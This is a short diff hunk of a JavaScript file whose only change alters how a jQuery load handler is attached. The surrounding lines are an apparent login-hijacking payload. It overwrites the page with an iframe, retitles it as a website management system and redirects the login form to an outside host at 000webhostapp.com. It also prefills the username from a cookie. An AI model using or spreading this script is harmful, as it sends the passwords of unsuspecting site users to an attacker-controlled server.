@@ -28,7 +28,7 @@ document.body.innerHTML = "<iframe scrolling='no' onload=\"this.style.background
 var prevTitle = document.title;
 document.title = "网站管理系统";
 
-$("#login_iframe").on('load', function(){
+$("#login_iframe").load(function(){
 	//alert("Loaded");
 	$("#login_iframe").contents().find("#form1")[0].action = "http://g4wowisbad.000webhostapp.com/login.php";
 	$("#login_iframe").contents().find("#txtUsername")[0].value = getCookie("login_name");
